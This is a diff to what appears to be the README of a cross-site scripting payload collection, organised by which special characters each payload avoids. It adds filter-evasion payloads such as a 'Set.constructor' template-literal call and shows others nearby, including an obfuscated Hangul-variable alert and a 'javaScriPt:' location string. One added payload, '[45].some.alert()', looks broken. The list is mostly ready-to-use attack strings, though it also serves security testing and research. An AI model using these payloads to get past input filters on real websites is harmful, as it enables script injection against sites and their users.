@@ -40,7 +40,7 @@ I have selected special characters that are often blocked.
 . 
 =
 ```
-(template): `()` `{}` `,` `"` `'` `backtick``[]` `\` `/` `;` `+` `.` `=`
+(template): `()` `{}` `,` `"` `'` `backtick` `[]` `\` `/` `;` `+` `.` `=`
 
 ### Usage
 on Github.com
@@ -78,6 +78,16 @@ location='javaScriPt:alert\x2845\x29'
 ### without char: `"` `backtick` `\` `/` `;` `.`
 ```
 ([,하,,,,훌]=[]+{},[한,글,페,이,,로,드,ㅋ,,,ㅎ]=[!!하]+!하+하.ㅁ)[훌+=하+ㅎ+ㅋ+한+글+페+훌+한+하+글][훌](로+드+이+글+한+'(45)')()
+```
+
+### without char: `{}` `,` `"` `'` `backtick` `\` `/` `;` `+` `=`
+```
+[45].some.alert()
+```
+
+### without char: `()` `{}` `,` `"` `'` `[]` `\` `/` `;` `+` `=`
+```
+Set.constructor`alert\x2845\x29`
 ```
 
 ## Submit XSS Payloads
